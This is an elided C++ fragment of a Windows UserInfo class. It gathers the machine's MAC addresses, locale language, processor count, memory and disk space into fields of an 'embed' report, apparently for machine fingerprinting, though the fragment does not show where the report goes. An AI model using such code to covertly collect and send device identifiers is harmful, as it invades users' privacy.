      ...
      for (int i = 0; i < ip_table->dwNumEntries; ++i) {
        if (localhost != ip_table->table[i].dwAddr) {
          ...
          if (MIB_IF_TYPE_ETHERNET == iInfo.dwType) {
            ...
            char macAddress[18];
            sprintf(macAddress, "%02x-%02x-%02x-%02x-%02x-%02x", byMAC[0],
                    byMAC[1], byMAC[2], byMAC[3], byMAC[4], byMAC[5]);
...
void UserInfo::AddLang() {
  ...
  if (GetLocaleInfoEx(LOCALE_NAME_USER_DEFAULT, LOCALE_SISO639LANGNAME, buffer,
...
void UserInfo::AddSystemInfo() {
  ...
  this->embed.fields["Processors"] =
      std::to_string(systemInfo.dwNumberOfProcessors);
  ...
  this->embed.fields["Total Physical Memory"] =
      std::to_string(memoryStatus.ullTotalPhys / (1024 * 1024)) + " MB";
  this->embed.fields["Available Physical Memory"] =
      std::to_string(memoryStatus.ullAvailPhys / (1024 * 1024)) + " MB";

  ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;
  GetDiskFreeSpaceExW(NULL, &freeBytesAvailable, &totalBytes, &totalFreeBytes);

  this->embed.fields["Total Disk Space"] =
      std::to_string(totalBytes.QuadPart / (1024 * 1024 * 1024)) + " GB";
  this->embed.fields["Free Disk Space"] =
      std::to_string(totalFreeBytes.QuadPart / (1024 * 1024 * 1024)) + " GB";
}
